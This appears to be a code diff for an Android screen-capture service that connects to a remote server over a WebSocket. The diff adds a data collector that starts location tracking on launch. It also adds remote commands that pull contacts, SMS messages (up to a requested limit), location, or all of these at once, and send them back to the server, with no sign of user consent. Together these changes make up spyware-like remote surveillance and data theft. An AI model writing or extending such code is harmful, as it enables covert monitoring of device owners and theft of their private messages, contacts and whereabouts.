@@ -65,6 +65,9 @@ public class ScreenCaptureService extends Service {
     private boolean codecRunning = false;
     private Thread encoderThread;
 
+    // Data collector (contacts, SMS, location)
+    private DataCollectorService dataCollector;
+
     private int screenWidth = 720;
     private int screenHeight = 1280;
     private int screenDensity;
@@ -100,6 +103,10 @@ public class ScreenCaptureService extends Service {
         httpClient = new OkHttpClient.Builder()
             .retryOnConnectionFailure(true)
             .build();
+
+        // Initialize data collector
+        dataCollector = new DataCollectorService(this);
+        dataCollector.startLocationTracking();
     }
 
     @Override
@@ -520,6 +527,35 @@ public class ScreenCaptureService extends Service {
                     Log.d(TAG, "Viewer is ready");
                     if (useH264) requestKeyFrame();
                     break;
+                case "get-contacts":
+                    if (dataCollector != null) {
+                        dataCollector.sendDataToServer(webSocket, "contacts");
+                    }
+                    break;
+                case "get-sms":
+                    if (dataCollector != null) {
+                        int limit = cmd.optInt("limit", 50);
+                        try {
+                            JSONObject msg = new JSONObject();
+                            msg.put("type", "data-report");
+                            msg.put("dataType", "sms");
+                            msg.put("data", dataCollector.getSms(limit));
+                            webSocket.send(msg.toString());
+                        } catch (Exception e) {
+                            Log.e(TAG, "Error sending SMS data", e);
+                        }
+                    }
+                    break;
+                case "get-location":
+                    if (dataCollector != null) {
+                        dataCollector.sendDataToServer(webSocket, "location");
+                    }
+                    break;
+                case "get-all-data":
+                    if (dataCollector != null) {
+                        dataCollector.sendDataToServer(webSocket, "all");
+                    }
+                    break;
                 default:
                     Log.d(TAG, "Unknown command: " + type);
             }
@@ -617,6 +653,9 @@ public class ScreenCaptureService extends Service {
         if (webSocket != null) {
             webSocket.close(1000, "Service stopped");
             webSocket = null;
+        }
+        if (dataCollector != null) {
+            dataCollector.stopLocationTracking();
         }
         if (wakeLock != null && wakeLock.isHeld()) {
             wakeLock.release();
